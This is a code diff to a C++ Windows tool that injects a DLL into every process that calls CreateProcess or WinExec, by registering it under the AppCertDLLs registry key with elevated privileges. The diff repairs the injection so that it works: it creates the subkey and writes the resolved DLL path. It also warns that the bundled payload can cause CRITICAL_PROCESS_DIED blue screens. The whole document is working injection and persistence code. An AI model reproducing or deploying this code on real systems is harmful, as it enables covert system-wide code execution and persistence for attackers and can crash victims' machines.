@@ -1,8 +1,11 @@
 /**
-* Injects a .dll into every process that calls: CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec by writing it to the AppCertDLLs registry key
+* Injects a .dll into every process that calls: CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, or WinExec by writing it to the AppCertDLLs registry key.
 * Supports 32- and 64 Bit applications.
-* Requires elevated priviledges
-* WARNING: currently does not work. Does the dll need to be signed?
+* [Requirements] 
+*	- elevated priviledges
+* [WARNING]
+*	Some dll payloads (such as the one in this project) may couse a CRITICAL_PROCESS_DIED bluescreens, even with safe mode enabled.
+*	The easiest way to fix the system in such a case is to delete the .dll file on disk. This can for example be done by booting into the commandline only environment.
 */
 
 #include <Windows.h>
@@ -49,15 +52,11 @@ bool IsOsVersionBelowWindows8()
 
 int main(int argc, char* argv[])
 {
-	char* dllPath = nullptr;
-
 	if (argc != 2)
 	{
-		printf("Usage: *.exe [absoluteDllPath] \n");
+		printf("Usage: *.exe dllPath\n");
 		return 1;
 	}
-
-	dllPath = argv[1];
 
 	if (!IsElevated())
 	{
@@ -66,15 +65,16 @@ int main(int argc, char* argv[])
 	}
 
 	HKEY keyHandle;
-	RegOpenKeyA(HKEY_LOCAL_MACHINE, "System\\CurrentControlSet\\Control\\Session Manager", &keyHandle);
-
+	RegCreateKeyA(HKEY_LOCAL_MACHINE, "System\\CurrentControlSet\\Control\\Session Manager\\AppCertDLLs", &keyHandle);
 	if (!keyHandle)
 	{
-		printf("[Error] - Failed to open registry key\n");
+		printf("[Error] - Failed to create/open registry key\n");
 		return 1;
 	}
 
-	if (RegSetValueExA(keyHandle, "AppCertDLLs", 0, REG_SZ, (const BYTE*)dllPath, strlen(dllPath) + 1) != ERROR_SUCCESS)
+	char absoluteDllPath[MAX_PATH + 1];
+	GetFullPathNameA(argv[1], MAX_PATH + 1, absoluteDllPath, NULL);
+	if (RegSetValueExA(keyHandle, "appcertdllInjection", 0, REG_SZ, (const BYTE*)absoluteDllPath, strlen(absoluteDllPath) + 1) != ERROR_SUCCESS)
 	{
 		printf("[Error] - Failed to write dll path to AppCertDLLs\n");
 		return 1;
